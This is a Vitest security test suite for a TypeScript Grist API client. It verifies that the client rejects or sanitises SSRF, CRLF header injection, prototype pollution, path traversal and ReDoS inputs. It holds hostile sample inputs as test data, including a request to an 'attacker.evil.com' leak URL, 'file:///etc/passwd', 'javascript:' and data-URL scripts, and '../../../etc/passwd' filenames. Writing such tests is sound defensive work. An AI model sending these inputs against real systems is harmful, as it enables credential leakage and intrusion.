import { describe, expect, it, vi } from 'vitest';
import { GristClient, parseDocUrl } from '../../src/client/GristClient';
import { QueryBuilder } from '../../src/client/QueryBuilder';
import { flattenRecord } from '../../src/client/RecordManager';
import { GristValidationError } from '../../src/errors';
import { AttachmentsResource } from '../../src/resources/AttachmentsResource';
import { SqlResource } from '../../src/resources/SqlResource';
import { normalizeGristError } from '../../src/transport/ErrorNormalizer';
import { HttpTransport } from '../../src/transport/HttpTransport';
import { resolveConfig } from '../../src/types/config';
import { formatPropertyKey } from '../../src/cli/typegen';

describe('Security Hardening & Vulnerability Remediation Suite', () => {
  describe('SSRF & Cross-Origin Credential Leak Protection', () => {
    it('rejects cross-origin absolute URLs in transport.request to prevent leaking Bearer API keys', async () => {
      const transport = new HttpTransport({
        apiKey: 'secret-token-12345',
        serverUrl: 'https://docs.getgrist.com',
      });

      await expect(
        transport.request('https://attacker.evil.com/leak')
      ).rejects.toThrow(GristValidationError);

      await expect(
        transport.request('https://attacker.evil.com/leak')
      ).rejects.toThrow(/Cross-origin request to "https:\/\/attacker\.evil\.com" is not permitted/);
    });

    it('rejects non-HTTP/HTTPS protocols in transport.request', async () => {
      const transport = new HttpTransport({
        serverUrl: 'https://docs.getgrist.com',
      });

      await expect(
        transport.request('javascript:alert(1)')
      ).rejects.toThrow(GristValidationError);

      await expect(
        transport.request('file:///etc/passwd')
      ).rejects.toThrow(/Only "http:" and "https:" requests are permitted/);
    });

    it('normalizes protocol-relative paths to prevent host confusion', async () => {
      let requestedUrl = '';
      const mockFetch = vi.fn().mockImplementation(async (url: string) => {
        requestedUrl = url;
        return new Response(JSON.stringify([]), { status: 200, headers: { 'Content-Type': 'application/json' } });
      });

      const transport = new HttpTransport({
        serverUrl: 'https://docs.getgrist.com',
        fetch: mockFetch,
      });

      await transport.request('//docs');
      expect(new URL(requestedUrl).origin).toBe('https://docs.getgrist.com');
      expect(new URL(requestedUrl).pathname).toBe('/api/docs');
    });
  });

  describe('Server URL & Document URL Validation', () => {
    it('rejects invalid or non-HTTP protocols in resolveConfig serverUrl', () => {
      expect(() => {
        resolveConfig({ serverUrl: 'javascript:alert(1)' });
      }).toThrow(GristValidationError);

      expect(() => {
        resolveConfig({ serverUrl: 'file:///etc/hosts' });
      }).toThrow(GristValidationError);

      expect(() => {
        resolveConfig({ serverUrl: 'not-a-valid-url' });
      }).toThrow(GristValidationError);

      expect(() => {
        resolveConfig({ serverUrl: '' });
      }).toThrow(GristValidationError);
    });

    it('rejects dangerous protocols in parseDocUrl', () => {
      expect(() => {
        parseDocUrl('javascript:alert(1)');
      }).toThrow(GristValidationError);

      expect(() => {
        parseDocUrl('file:///etc/passwd');
      }).toThrow(GristValidationError);

      expect(() => {
        parseDocUrl('data:text/html,<script>alert(1)</script>');
      }).toThrow(GristValidationError);
    });
  });

  describe('CRLF Header Injection Defense', () => {
    it('rejects API keys containing carriage return or newline characters', () => {
      expect(() => {
        resolveConfig({ apiKey: 'my-key\r\nInjected-Header: evil' });
      }).toThrow(GristValidationError);

      expect(() => {
        resolveConfig({ apiKey: 'my-key\ninjected: evil' });
      }).toThrow(/contains carriage return or newline characters/);
    });

    it('rejects custom headers containing CRLF characters in key or value', () => {
      expect(() => {
        resolveConfig({
          headers: {
            'X-Custom\r\nInjected': 'value',
          },
        });
      }).toThrow(GristValidationError);

      expect(() => {
        resolveConfig({
          headers: {
            'X-Custom': 'value\r\nInjected: evil',
          },
        });
      }).toThrow(/contains carriage return or newline characters/);
    });
  });

  describe('Prototype Pollution Defense', () => {
    it('flattenRecord strips __proto__, constructor, and prototype from fields', () => {
      const maliciousPayload = JSON.parse(
        '{"id": 42, "fields": {"name": "Test", "__proto__": {"polluted": true}, "constructor": "evil", "prototype": "bad"}}'
      );

      const flattened = flattenRecord(maliciousPayload);

      // Verify that Object.prototype is not polluted
      expect((Object.prototype as unknown as { polluted?: boolean }).polluted).toBeUndefined();
      // Verify stripped from result object
      expect(flattened.name).toBe('Test');
      expect(flattened.id).toBe(42);
      expect(Object.prototype.hasOwnProperty.call(flattened, '__proto__')).toBe(false);
      expect(flattened.constructor).toBe(Object);
    });

    it('SqlResource unwrapRecord strips prototype pollution keys and preserves row ID', async () => {
      const mockFetch = vi.fn().mockResolvedValue(
        new Response(
          JSON.stringify({
            records: [
              {
                id: 100,
                fields: {
                  id: 999, // user field named id
                  title: 'Order #1',
                  __proto__: { admin: true },
                },
              },
            ],
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        )
      );

      const transport = new HttpTransport({
        serverUrl: 'https://docs.getgrist.com',
        fetch: mockFetch,
      });
      const sqlResource = new SqlResource(transport);

      const results = await sqlResource.query<{ id: number; title: string }>('doc123', 'SELECT * FROM Orders');

      expect((Object.prototype as unknown as { admin?: boolean }).admin).toBeUndefined();
      expect(results[0]?.id).toBe(100); // Grist row ID preserved, not shadowed by 999
      expect(results[0]?.title).toBe('Order #1');
    });

    it('SqlResource rejects empty or whitespace SQL queries', async () => {
      const transport = new HttpTransport({ serverUrl: 'https://docs.getgrist.com' });
      const sqlResource = new SqlResource(transport);

      await expect(sqlResource.query('doc123', '')).rejects.toThrow(GristValidationError);
      await expect(sqlResource.query('doc123', '   ')).rejects.toThrow(GristValidationError);
    });
  });

  describe('Denial of Service & Infinite Loop Protection in Iterators', () => {
    it('RecordManager.iterate handles NaN or negative batchSize safely without infinite loops', async () => {
      const mockFetch = vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ records: [] }), {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
        })
      );

      const client = new GristClient({
        serverUrl: 'https://docs.getgrist.com',
        fetch: mockFetch,
      });

      // Pass NaN batchSize
      const iterator = client.doc('doc123').table('table1').records.iterate({
        batchSize: NaN as unknown as number,
      });

      const results = [];
      for await (const row of iterator) {
        results.push(row);
      }

      expect(results).toEqual([]);
      expect(mockFetch).toHaveBeenCalledTimes(1);
    });

    it('QueryBuilder.iterate handles limit: 0, NaN, and negative offsets gracefully without infinite loops', async () => {
      const mockFetch = vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ records: [{ id: 1, fields: { a: 1 } }] }), {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
        })
      );

      const client = new GristClient({
        serverUrl: 'https://docs.getgrist.com',
        fetch: mockFetch,
      });

      const qb = new QueryBuilder(client.doc('doc123').table('table1').records);

      // limit(0) should yield nothing and exit immediately
      qb.limit(0);
      const rowsZero = [];
      for await (const row of qb.iterate()) {
        rowsZero.push(row);
      }
      expect(rowsZero).toEqual([]);
      expect(mockFetch).not.toHaveBeenCalled();

      // limit(NaN) should safely fall back and not loop infinitely
      const qbNaN = new QueryBuilder(client.doc('doc123').table('table1').records);
      qbNaN.limit(NaN as unknown as number);
      const rowsNaN = [];
      for await (const row of qbNaN.iterate()) {
        rowsNaN.push(row);
      }
      expect(rowsNaN.length).toBe(1);
    });
  });

  describe('ReDoS & Error Parsing Hardening', () => {
    it('handles oversized HTML error pages efficiently without catastrophic backtracking', () => {
      // Create a 500KB HTML string with unclosed tags and nested whitespace
      const padding = '<div>' + ' '.repeat(50000) + '<p>Error occurred</p></div>'.repeat(10);
      const massiveHtml = `<!DOCTYPE html><html><head><title>Bad Gateway</title></head><body>${padding}</body></html>`;

      const start = performance.now();
      const error = normalizeGristError(502, massiveHtml);
      const elapsed = performance.now() - start;

      expect(error.message).toBe('Bad Gateway');
      expect(elapsed).toBeLessThan(100); // Must parse in under 100ms
    });

    it('extracts messages safely from huge text errors without crashing', () => {
      const hugeText = 'A'.repeat(100000);
      const error = normalizeGristError(500, hugeText);
      expect(error.message).toBeDefined();
    });
  });

  describe('Attachments Path Traversal Sanitization', () => {
    it('sanitizes directory traversal characters from filenames during upload', async () => {
      let appendedFilename = '';
      const mockFetch = vi.fn().mockImplementation(async (_url: string, init?: RequestInit) => {
        const body = init?.body as FormData;
        // In Node FormData, inspect entries
        const fileEntry = body.get('upload') as File;
        appendedFilename = fileEntry.name;
        return new Response(JSON.stringify([101]), { status: 200, headers: { 'Content-Type': 'application/json' } });
      });

      const transport = new HttpTransport({
        serverUrl: 'https://docs.getgrist.com',
        fetch: mockFetch,
      });
      const attachments = new AttachmentsResource(transport);

      await attachments.upload('doc123', {
        filename: '../../../etc/passwd',
        data: new Uint8Array([1, 2, 3]),
      });

      expect(appendedFilename).toBe('passwd');
      expect(appendedFilename).not.toContain('..');
      expect(appendedFilename).not.toContain('/');
      expect(appendedFilename).not.toContain('\\');
    });

    it('safely no-ops on empty array for attachments upload without network request', async () => {
      const mockFetch = vi.fn();
      const transport = new HttpTransport({
        serverUrl: 'https://docs.getgrist.com',
        fetch: mockFetch,
      });
      const attachments = new AttachmentsResource(transport);

      const res = await attachments.upload('doc123', []);
      expect(res).toEqual([]);
      expect(mockFetch).not.toHaveBeenCalled();
    });

    it('rejects invalid or non-positive attachmentId in download and getMetadata', async () => {
      const transport = new HttpTransport({ serverUrl: 'https://docs.getgrist.com' });
      const attachments = new AttachmentsResource(transport);

      await expect(attachments.download('doc123', NaN)).rejects.toThrow(GristValidationError);
      await expect(attachments.download('doc123', -1)).rejects.toThrow(GristValidationError);
      await expect(attachments.download('doc123', 0)).rejects.toThrow(GristValidationError);

      await expect(attachments.getMetadata('doc123', NaN)).rejects.toThrow(GristValidationError);
      await expect(attachments.getMetadata('doc123', -5)).rejects.toThrow(GristValidationError);
    });
  });

  describe('Typegen Code & Syntax Injection Defense', () => {
    it('escapes newlines, carriage returns, tabs, and quotes in formatPropertyKey', () => {
      expect(formatPropertyKey('simpleName')).toBe('simpleName');
      expect(formatPropertyKey('Name with spaces')).toBe("'Name with spaces'");
      expect(formatPropertyKey("Name'With'Quotes")).toBe("'Name\\'With\\'Quotes'");
      expect(formatPropertyKey('Line1\nLine2')).toBe("'Line1\\nLine2'");
      expect(formatPropertyKey('Line1\r\nLine2')).toBe("'Line1\\r\\nLine2'");
      expect(formatPropertyKey('Tab\tSeparated')).toBe("'Tab\\tSeparated'");
    });
  });
});
